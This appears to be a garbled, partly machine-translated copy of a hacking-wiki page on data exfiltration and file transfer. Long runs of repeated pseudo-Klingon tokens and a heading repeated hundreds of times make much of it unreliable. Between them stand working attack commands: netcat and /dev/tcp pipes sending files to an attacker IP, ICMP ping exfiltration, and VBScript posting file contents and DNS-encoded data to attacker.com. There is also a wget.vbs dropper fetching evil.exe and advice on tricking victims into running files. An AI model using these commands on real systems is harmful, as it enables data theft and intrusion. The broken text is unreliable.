vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

### Description

NC (Netcat) is a versatile networking utility that can be used for various purposes, including exfiltration of data. It allows for establishing TCP or UDP connections, making it useful for transferring data between systems.

### Methodology

1. **Establish a listener**: Start a listener on the receiving system using the following command:

   ```
   nc -l -p <port>
   ```

   Replace `<port>` with the desired port number.

2. **Send data**: On the system with the data to be exfiltrated, use the following command to send the data to the listener:

   ```
   nc <receiver_ip> <port> < <file>
   ```

   Replace `<receiver_ip>` with the IP address of the receiving system, `<port>` with the port number used by the listener, and `<file>` with the path to the file containing the data.

3. **Receive data**: On the receiving system, the data will be received and displayed in the terminal where the listener was started.

### Example

1. Start the listener on the receiving system:

   ```
   nc -l -p 1234
   ```

2. Send a file named `data.txt` from the sending system to the listener:

   ```
   nc 192.168.0.100 1234 < data.txt
   ```

3. The contents of `data.txt` will be displayed on the terminal of the receiving system.

### Notes

- NC can be used for both local and remote exfiltration of data.
- Ensure that the necessary ports are open and accessible between the systems involved.
- NC can also be used for other networking tasks, such as port scanning and banner grabbing.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
#### Description

This technique allows you to download a file from a victim machine using the `/dev/tcp` file descriptor in Linux systems.

#### Syntax

```bash
cat < /dev/tcp/<victim_ip>/<port> > <local_file>
```

#### Example

```bash
cat < /dev/tcp/192.168.0.100/8080 > secret_file.txt
```

#### Explanation

In this example, the `cat` command is used to read the contents of the file descriptor `/dev/tcp/192.168.0.100/8080` and redirect it to the file `secret_file.txt` on the attacker's machine. The `<victim_ip>` represents the IP address of the victim machine, and `<port>` represents the port number on which the file is hosted.

#### Advantages

- Simple and easy to use.
- Does not require any additional tools or software.

#### Limitations

- Only works on Linux systems.
- Requires the victim machine to have outbound internet access.
- May trigger security alerts if monitored.

#### Mitigation

- Disable outbound internet access on the victim machine.
- Monitor network traffic for suspicious activity.
- Implement strict firewall rules to block unauthorized outbound connections.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### QapHa' vItlhutlh

To upload a file to the victim's system, you can use various methods depending on the access and privileges you have gained. Here are a few techniques you can employ:

#### 1. Web-based File Upload

If the victim's system has a web application that allows file uploads, you can leverage this functionality to upload your file. Look for vulnerabilities such as insufficient file type validation, unrestricted file size, or inadequate server-side checks. Exploit these weaknesses to upload your file.

#### 2. Remote File Inclusion (RFI)

If the victim's system includes functionality to include remote files, you can exploit this feature to upload your file. Look for vulnerabilities such as unsanitized user input or insecure file inclusion methods. Craft a payload that points to your file and inject it into the vulnerable parameter.

#### 3. Exploiting File Permissions

If you have gained administrative or root access to the victim's system, you can directly copy your file to a location with write permissions. Identify directories with lax file permissions or misconfigured access controls. Use tools like `cp` or `scp` to copy your file to the desired location.

#### 4. Social Engineering

In some cases, you may be able to trick the victim into downloading and executing your file. Craft a convincing message or disguise your file as something harmless or desirable. Send the file to the victim via email, messaging platforms, or other communication channels. Exploit their curiosity or trust to make them execute the file.

Remember, always exercise caution and ensure you have the necessary permissions and legal authorization before attempting any file upload to a victim's system.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
**ICMP** stands for Internet Control Message Protocol. It is a network protocol used for sending error messages and operational information between network devices. ICMP is commonly used for diagnostic and troubleshooting purposes in network administration.

In the context of hacking, ICMP can be used for exfiltration, which is the unauthorized transfer of data from a network. Exfiltration through ICMP involves encoding the data into ICMP packets and sending them to a remote server. The server then decodes the packets and retrieves the exfiltrated data.

To perform ICMP exfiltration, an attacker needs to have control over a compromised host within the target network. The attacker can then use various techniques to encode the data into ICMP packets, such as modifying the payload of the packets or using covert channels within the ICMP protocol.

ICMP exfiltration can be difficult to detect, as ICMP traffic is commonly allowed in most network environments. However, network monitoring and intrusion detection systems can be configured to detect unusual patterns or excessive ICMP traffic, which may indicate exfiltration attempts.

It is important for network administrators to implement proper security measures to prevent ICMP exfiltration, such as monitoring and filtering ICMP traffic, implementing intrusion detection systems, and regularly patching and updating network devices to prevent vulnerabilities that could be exploited for exfiltration purposes.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

**SMTP**

vaj vItlhutlh data SMTP server, vaj vItlhutlh SMTP python vItlhutlh data vItlhutlh:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

By default in XP and 2003 (in others it needs to be explicitly added during installation)

In Kali, **start TFTP server**:

## TFTP

XP 'ej 2003 (vaj others vItlhutlh) DaH jImejDaq 'e' vItlhutlh

Kali, **TFTP server Qap**:

```bash
service tftpd-hpa start
```

## TFTP

XP 'ej 2003 (vaj others vItlhutlh) DaH jImejDaq 'e' vItlhutlh

Kali, **TFTP server Qap**:

```bash
service tftpd-hpa start
```
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python:**

**TFTP server in python
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**Qa'vIn** **ghaH** **Kali** **server** **vItlhutlh** **victim** **Daq**:

```bash
ssh kali@<Kali_server_IP>
```

Replace `<Kali_server_IP>` with the actual IP address of the Kali server.
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Download a file with a PHP oneliner:

## Klingon

Download a file with a PHP oneliner:

```php
<?php
$fileUrl = 'http://example.com/file.txt';
$saveTo = '/path/to/save/file.txt';
file_put_contents($saveTo, file_get_contents($fileUrl));
?>
```

This PHP code snippet allows you to download a file from a specified URL and save it to a specified location on your system. Simply replace the `$fileUrl` variable with the URL of the file you want to download, and replace the `$saveTo` variable with the path where you want to save the downloaded file.
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

### Introduction

VBScript (Visual Basic Scripting Edition) is a scripting language developed by Microsoft. It is often used for automating tasks and creating dynamic web pages. In the context of hacking, VBScript can be used for various purposes, including exfiltration of data.

### Exfiltration Techniques

#### 1. File Transfer

VBScript can be used to transfer files from the target system to the attacker's machine. This can be achieved by reading the contents of a file on the target system and sending it to the attacker's machine using various methods such as HTTP, FTP, or email.

```vbs
' Read the contents of a file
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\path\to\file.txt", 1)
strContents = objFile.ReadAll
objFile.Close

' Send the contents to the attacker's machine using HTTP
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", "http://attacker.com/upload.php", False
objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.Send "data=" & strContents
```

#### 2. Data Encoding

To avoid detection and bypass security measures, data can be encoded before exfiltration. VBScript provides various encoding techniques, such as Base64 encoding, that can be used to encode the data before sending it to the attacker's machine.

```vbs
' Encode the data using Base64
Set objXML = CreateObject("Msxml2.DOMDocument.6.0")
Set objNode = objXML.CreateElement("base64")
objNode.DataType = "bin.base64"
objNode.Text = StreamToBase64(strContents)
strEncodedData = objNode.Text

' Send the encoded data to the attacker's machine using HTTP
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", "http://attacker.com/upload.php", False
objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.Send "data=" & strEncodedData
```

#### 3. DNS Exfiltration

VBScript can also be used for exfiltrating data using DNS requests. This technique involves encoding the data and sending it as part of a DNS query to a controlled DNS server. The attacker can then capture the DNS queries and extract the exfiltrated data.

```vbs
' Encode the data using Base64
Set objXML = CreateObject("Msxml2.DOMDocument.6.0")
Set objNode = objXML.CreateElement("base64")
objNode.DataType = "bin.base64"
objNode.Text = StreamToBase64(strContents)
strEncodedData = objNode.Text

' Send the encoded data as part of a DNS query
strDNSQuery = "subdomain." & strEncodedData & ".attacker.com"
Set objDNS = CreateObject("DNSResolver")
objDNS.Query(strDNSQuery, 1, 1)
```

### Conclusion

VBScript provides various techniques for exfiltrating data from a target system. By leveraging these techniques, an attacker can transfer sensitive information to their machine without being detected. It is important for defenders to be aware of these techniques and implement appropriate security measures to prevent data exfiltration.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Qa'Hom**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe` program vItlhutlh vItlhutlh vaj **hex vItlhutlh vItlhutlh vItlhutlh**. vaj hex binary vItlhutlh debug.exe vItlhutlh binary file. vaj, debug.exe **64 kb binary vItlhutlh vItlhutlh**. vItlhutlh.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
vIghro' je copy-paste qar'a' windows-shell 'ej nc.exe file created will be.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

vItlhutlh vulnerabilities vItlhutlhpu' so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
